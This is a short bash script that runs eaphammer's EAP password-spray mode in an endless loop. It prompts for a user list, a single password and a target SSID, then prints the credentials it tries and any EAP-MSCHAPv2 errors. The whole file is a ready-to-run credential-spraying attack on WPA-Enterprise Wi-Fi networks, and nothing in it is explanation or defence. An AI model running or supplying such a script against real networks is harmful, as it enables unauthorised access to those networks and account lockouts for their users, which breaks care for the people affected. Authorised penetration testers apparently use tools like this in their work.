#!/bin/bash
echo "script expects to be run from same Dir as eaphammer"
read -p "Where is the userList? (absolute path only) " userList
read -p "What password should we use? " password
read -p "What SSID will we be using? " ssid
echo "Ok, good luck, cancel with CTRL+C"
set +e
i=1
while true; do
  echo "Running again for the..." $((i++)) " time"
  sudo ./eaphammer --eap-spray \
    --interface-pool wlan0 \
    --essid $ssid \
    --password $password \
    --user-list $userList  > someeaphammerfile.txt
  AttemptedCreds=$(grep -Eio "Trying credentials:.*" someeaphammerfile.txt)
  error=$(grep -Eio "EAP-MSCHAPV2:.*" someeaphammerfile.txt)
  echo $AttemptedCreds
  echo $error
  rm someeaphammerfile.txt
  echo "Cancel with CTRL+C"
  echo "Another One"
done